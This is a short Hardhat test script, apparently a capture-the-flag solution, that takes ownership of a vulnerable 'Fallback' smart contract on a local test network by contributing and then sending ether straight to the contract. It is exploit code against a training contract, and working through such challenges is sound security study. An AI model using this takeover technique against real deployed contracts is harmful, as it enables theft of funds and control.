import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
	it("Should work", async () => {
		const [, attacker] = await ethers.getSigners();
		const Fallback = await ethers.getContractFactory("Fallback");
		const fallback = await Fallback.deploy();

		await fallback.connect(attacker).contribute({ value: "1" });
		expect(await fallback.connect(attacker).getContribution()).to.eq("1");

		await attacker.sendTransaction({ to: fallback.address, value: "1" });
		expect(await fallback.owner()).to.eq(attacker.address);
	})
})
